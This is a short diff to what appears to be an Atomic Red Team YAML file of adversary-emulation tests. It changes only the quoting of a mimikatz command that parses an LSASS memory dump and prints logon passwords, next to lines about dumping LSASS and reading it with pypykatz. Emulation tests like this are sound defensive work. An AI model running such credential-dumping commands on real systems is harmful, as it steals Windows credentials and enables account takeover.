@@ -175,7 +175,7 @@ atomic_tests:
       Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
   executor:
     command: |
-      "#{mimikatz_exe}" "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
+      #{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
     name: command_prompt
     elevation_required: true
 - name: LSASS read with pypykatz
